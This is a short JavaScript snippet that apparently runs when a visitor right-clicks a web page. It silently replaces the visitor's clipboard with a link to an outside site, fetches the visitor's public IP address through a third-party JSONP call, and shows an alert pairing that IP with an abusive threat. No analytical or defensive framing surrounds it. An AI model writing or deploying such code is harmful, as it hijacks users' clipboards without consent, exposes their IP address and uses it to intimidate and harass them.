function showContextMenu(event){
    navigator.clipboard.writeText("https://pom.lat/scripts/index.html");

    var script = document.createElement('script');
    script.type = 'application/javascript';
    script.src = 'https://api.ipify.org?format=jsonp&callback=displayIP';
    document.body.appendChild(script);

    return false;
}

function displayIP(json) {
var ipAddress = json.ip;
alert("Do you want to get beamed you fat bitch? " + ipAddress);
}
